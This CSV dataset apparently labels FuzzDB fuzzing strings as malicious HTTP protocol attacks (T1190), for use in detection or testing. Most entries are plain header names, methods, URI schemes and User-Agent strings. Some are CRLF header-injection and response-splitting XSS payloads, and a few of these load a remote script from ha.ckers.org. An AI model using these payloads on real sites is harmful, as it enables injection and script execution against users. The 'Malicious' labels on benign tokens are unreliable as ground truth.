xri:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ssh:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[=1&id=2]=3,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Language,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id;id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1?id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
z39.50r:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dict:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
z39.50s:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=id['1']=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
REPORT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aw:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
svn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
udp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Set-Cookie,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
feed:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gg:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
LOCK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-MS-ENUMATTS,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id&id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Disposition,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
0x0D0x0D0x0A0x0A,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=/:@&=+$&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
afp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Connection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
view-source:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%26id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
things:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.beep:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mailto:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rtsp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sgn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
http:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nntp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
notes:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POST,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
https:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
prospero:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
git:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Security-Policy,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BCOPY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
keyparc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soap.beep:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POLL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
file:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Max-Forwards,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
NOTIFY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.79 [en] (WinNT; U),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
secondlife:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
query:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0aX-Injection-Header:%20AttackValue,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Server,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldaps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0%0d%0ad%0%0d%0aa,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0aX-Injection-Header:%20AttackValue,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0d%0a%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%5cr%5cn,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&&&&id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1?id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
0x0D0x0A,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
0x0D0x0D0x0A0x0A,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
;id=1?id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
????id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id&=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id&id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id;id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=%23?id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=/:@&=+$&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1#id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%2526id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%26id%3D2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%26id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%c0%a6id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%u0026;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&#38;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&amp;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1\\uc0a6id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id==1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id===1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=id['1']=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id['&id=1']=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[1&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[=/:@&=+$&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[=1&id=2]=3,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[]=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ACL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ARBITRARY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Charset,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Datetime,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Language,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Ranges,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Access-Control-Allow-Origin,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Age,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Allow,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Authorization,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BASELINE-CONTROL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BCOPY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BDELETE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BMOVE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BPROPFIND,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BPROPPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CHECKIN,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CHECKOUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CONNECT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Cache-Control,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Connection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Disposition,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Language,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Length,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Location,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-MD5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Security-Policy,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Type,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Cookie,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DEBUG,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DNT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ETag,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Expires,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
From,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Front-End-Https,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
GET,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
INDEX,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Match,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Modified-Since,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-None-Match,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Unmodified-Since,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
LOCK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Last-Modified,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKACTIVITY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKCOL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKWORKSPACE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Max-Forwards,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
NOTIFY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
OPTIONS,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ORDERPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Origin,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
P3P,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POLL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POST,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPFIND,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Pragma,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authenticate,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authorization,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Connection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Public-Key-Pins,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
REPORT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
RPC_IN_DATA,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
RPC_OUT_DATA,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Referer,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Refresh,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Retry-After,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SEARCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SUBSCRIBE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Server,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Set-Cookie,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Status,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Strict-Transport-Security,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Trailer,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Transfer-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNCHECKOUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNLOCK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNSUBSCRIBE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Upgrade,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/1.22 (compatible; MSIE 2.0d; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/2.0 (compatible; MSIE 3.02; Update a; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; (R1 1.6)),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.79 [en] (WinNT; U),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (PLAYSTATION 3; 1.00),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729) JBroFuzz/1.4,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
